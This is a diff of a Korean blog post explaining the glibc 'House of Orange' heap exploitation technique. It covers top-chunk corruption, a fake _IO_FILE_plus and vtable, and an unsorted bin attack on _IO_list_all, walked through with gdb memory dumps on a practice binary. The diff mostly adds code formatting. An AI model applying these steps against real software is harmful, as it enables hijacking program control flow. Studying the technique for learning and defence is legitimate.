@@ -19,25 +19,25 @@ mermaid: true
     - 1개의 heap 영역 생성
     - top chunk 영역에 값을 덮어씀
         - top chunk + size는 페이지 정렬
-        - top chunk 값에 prev_inuse 비트 설정
+        - top chunk 값에 `prev_inuse` 비트 설정
         - Ex) top chunk : 0x20c01 -> 0xc01
     - top chunk 영역의 값보다 큰 크기의 heap 영역 생성
         - malloc은 요청을 처리하기 위해 sysmalloc 호출
-        - `sysmalloc()`의 `_int_free()` 함수에 의해 "top chunk - 0x8" 영역이 unsorted bin에 등록
-2. write to fake "struct _IO_FILE_plus", Fake"struct _IO_wide_data"
-    - free chunk 영역에 fake "struct _IO_FILE_plus", Fake"struct _IO_wide_data" 구조 작성
-        - fake "struct _IO_FILE_plus"
-            - _mode = ‘0’ 보다 큰 값
-            - vtable = "Fake vtable address"
+        - `sysmalloc()`의 `_int_free()` 함수에 의해 `top chunk - 0x8` 영역이 unsorted bin에 등록
+2. write to fake `struct _IO_FILE_plus`, Fake `struct _IO_wide_data`
+    - free chunk 영역에 fake `struct _IO_FILE_plus`, Fake `struct _IO_wide_data` 구조 작성
+        - fake `struct _IO_FILE_plus`
+            - _mode = '0' 보다 큰 값
+            - vtable = `Fake vtable address`
             - _wide_data = Fake "struct _IO_wide_data" 저장된 주소
-        - fake "struct _IO_wide_data"
-            - fake "struct _IO_FILE_plus"가 작성된 공간을 활용
-            - _IO_flush_all_lockp() 함수에서 사용하지 않는 "fp" 변수의 _freeres_list, "_freeres_buf" 영역 활용
+        - fake `struct _IO_wide_data`
+            - fake `struct _IO_FILE_plus`가 작성된 공간을 활용
+            - `_IO_flush_all_lockp()` 함수에서 사용하지 않는 `fp` 변수의 `_freeres_list`, `_freeres_buf` 영역 활용
                 - fp->_freeres_list = _wide_data->_IO_write_ptr
                 - fp->_freeres_buf = _wide_data->_IO_write_base
 3. unsorted bin attack
-    - free chunk의 bk 영역에 "&_IO_list_all - 0x10" 값을 덮어씀
-    - free chunk를 smallbin\[4\]에 등록하기 위해 free chunk size 변경
+    - free chunk의 bk 영역에 `&_IO_list_all - 0x10` 값을 덮어씀
+    - free chunk를 smallbin[4]에 등록하기 위해 free chunk size 변경
     - 새로운 heap 영역 생성
 
 ## Vunlerability
@@ -45,7 +45,7 @@ mermaid: true
 `sysmalloc()`에서 `_int_free()` 호출하기 위해 다음 조건을 만족해야 한다.
 
 - Top chunk + size는 페이지 정렬되어 있어야 함
-- Top chunk 값에 prev_inuse 비트 설정되어 있어야 함
+- Top chunk 값에 `prev_inuse` 비트 설정되어 있어야 함
 
 ```c
 // malloc.c
@@ -63,7 +63,7 @@ assert ((old_top == initial_top (av) && old_size == 0) ||
 assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
 ```
 
-glibc의 _int_malloc()에서 메모리 손상을 탐지하고 다음과 같은 순서로 함수 호출한다.
+glibc의 `_int_malloc()`에서 메모리 손상을 탐지하고 다음과 같은 순서로 함수 호출한다.
 
 `_int_malloc()` -\> `malloc_printerr()` -\> `__libc_message` -\> `__FI_abort()` -\> `_IO_flush_all_lockp()`
 
@@ -84,7 +84,7 @@ for (;; )
 
 ### _IO_flush_all_lockp()
 
-top chunk와 unsorted bin attack을 이용해 "_IO_list_all" 값을 변경하였으나, 변경된 값은 main_arena의 주소이다. 즉, "fp" 변수에 저장된 값은 main_arena의 주소이며, 해당 값을 "fp = fp-\>_chain" 코드에 의해 Fake "_IO_FILE_plus" 주소로 변경할 수 있다. `_IO_flush_all_lockp()` 함수는 "fp" 변수에 저장된 주소 값을 기준으로 호출할 `_IO_OVERFLOW()` 함수의 주소를 찾는다.
+top chunk와 unsorted bin attack을 이용해 `_IO_list_all` 값을 변경하였으나, 변경된 값은 `main_arena`의 주소이다. 즉, `fp` 변수에 저장된 값은 `main_arena`의 주소이며, 해당 값을 `fp = fp->_chain` 코드에 의해 Fake `_IO_FILE_plus` 주소로 변경할 수 있다. `_IO_flush_all_lockp()` 함수는 `fp` 변수에 저장된 주소 값을 기준으로 호출할 `_IO_OVERFLOW()` 함수의 주소를 찾는다.
 
 ```c
 // genops.c
@@ -533,7 +533,7 @@ addr                prev                size                 status             
 0x602000            0x0                 0x400                Used                None              None
 ```
 
-top chunk + size는 page 정렬이 되어있어야 한다. top chunk 값에 prev_inuse bit 설정한다.
+top chunk + size는 page 정렬이 되어있어야 한다. top chunk 값에 `prev_inuse` bit 설정한다.
 
 ```
 gdb-peda$ x/24gx 0x602400
@@ -563,9 +563,9 @@ addr                prev                size                 status             
 0x602400            0x0                 0xbe0                Freed     0x7ffff7dd1b78    0x7ffff7dd1b78
 ```
 
-top\[2\] + 0x9a8 = 0x00007ffff7dd2520 : `_IO_list_all`
+top[2] + 0x9a8 = 0x00007ffff7dd2520 : `_IO_list_all`
 
-old Top chunk의 bk 영역에 "_IO_list_all - 0x10" 삽입하여 _IO_list_all에 main_arena+88 영역이 등록되도록 한다.
+old Top chunk의 bk 영역에 `_IO_list_all - 0x10` 삽입하여 `_IO_list_all`에 `main_arena+88` 영역이 등록되도록 한다.
 
 ```
 gdb-peda$ x/24gx 0x602400
@@ -573,7 +573,7 @@ gdb-peda$ x/24gx 0x602400
 0x602410:   0x00007ffff7dd1b78  0x00007ffff7dd2510 <- _IO_list_all - 0x10
 ```
 
-`_IO_OVERFLOW(fp, EOF)` : fp를 인자로 입력받아서 _IO_OVERFLOW(system)을 실행시킬 것이다. fp-\>chain을 통해 fp를 변조하기 위해 size를 smallbin\[4\]의 크기로 변조한다.
+`_IO_OVERFLOW(fp, EOF)` : fp를 인자로 입력받아서 `_IO_OVERFLOW(system)`을 실행시킬 것이다. `fp->chain`을 통해 `fp`를 변조하기 위해 size를 smallbin\[4\]의 크기로 변조한다.
 
 ```
 gdb-peda$ x/24gx 0x602400
@@ -581,13 +581,13 @@ gdb-peda$ x/24gx 0x602400
 0x602410:   0x00007ffff7dd1b78         0x00007ffff7dd2510
 ```
 
-_IO_OVERFLOW를 실행시키기 위해 다음과 같이 Fake _IO_FILE 영역을 변조한다.
+_IO_OVERFLOW를 실행시키기 위해 다음과 같이 Fake `_IO_FILE` 영역을 변조한다.
 
 - fp->_mode = 0;
 - fp->_IO_write_base = (char *) 2;
 - fp->_IO_write_ptr = (char *) 3;
 
-jump_table\[3\](_IO_OVERFLOW) 위치를 winner()의 주소로 변조한다.
+`jump_table\[3\](_IO_OVERFLOW)` 위치를 `winner()`의 주소로 변조한다.
 
 ```
 gdb-peda$ x/24gx 0x602400
@@ -601,7 +601,7 @@ gdb-peda$ x/24gx 0x602400
 0x602470:   0x0000000000000000  0x000000000040078f <- _IO_OVERFLOW()
 ```
 
-fp = fp->_chain 코드에 의해 smallbin\[4\](0x602400)에 저장된 값이 fp에 저장된다.
+`fp = fp->_chain` 코드에 의해 smallbin\[4\](0x602400)에 저장된 값이 fp에 저장된다.
 
 ```
 gdb-peda$ p fp
@@ -623,7 +623,9 @@ gdb-peda$ p fp
 $3 = (struct _IO_FILE *) 0x602400
 ```
 
-변경된 fp 값에 의해 vtable 주소가 변경되었다. * 0x602400 + 0xd8 = 0x602460(vtable) * 0x602460 + 0x18 = 0x40078f(_IO_overflow_t)
+변경된 `fp` 값에 의해 `vtable` 주소가 변경되었다. 
+* 0x602400 + 0xd8 = 0x602460(vtable) 
+* 0x602460 + 0x18 = 0x40078f(_IO_overflow_t)
 
 ```
 beomsu317@ubuntu-16:~/pwnable/house_of_orange$ ./hoo 
